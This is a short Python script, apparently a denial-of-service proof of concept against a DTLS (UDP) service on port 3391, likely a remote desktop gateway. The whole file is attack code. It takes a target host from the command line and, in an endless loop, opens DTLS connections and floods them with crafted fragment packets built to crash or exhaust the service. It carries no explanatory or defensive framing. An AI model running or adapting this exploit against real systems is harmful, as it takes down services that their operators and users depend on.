import OpenSSL
import argparse
import struct
import socket
from cryptography.hazmat.bindings.openssl.binding import Binding


def create_dos_packet(fragment_id_no, fragment):
	buf = b""
	frag_len = len(fragment)
	buf+=struct.pack("<HHHHH", 5, frag_len+6, fragment_id_no, fragment_id_no, 1000)
	buf+=fragment
	return buf

class connection:
	def __init__(self, host:str, port:int):
		self.host = host
		self.port = port
		self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		binding = Binding()
		binding.init_static_locks()
		# Binding the DTLSv1 method to SSL context methods 1st entry
		# Required as this is UDP
		OpenSSL.SSL.Context._methods[0]= getattr(binding.lib, "DTLSv1_client_method")
		ctx = OpenSSL.SSL.Context(0)
		self.socket = OpenSSL.SSL.Connection(ctx, self.s)
		self.connect()

	def connect(self):
		self.socket.connect((self.host, self.port))
		self.socket.do_handshake()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('host', metavar='host', type=str, help='Host name or ip')
	parser.add_argument('port', metavar='port', type=int, help='Port number, default: 3391', default=3391)
	args = parser.parse_args()

	print(f"Sending DoS packets to {args.host}...")
	i = 0
	while True:
		c = connection(args.host, args.port)
		for j in range(4):
			c.socket.send(create_dos_packet(i+j, b"\x41"*1000))
		i+=1

if __name__=='__main__':
	main()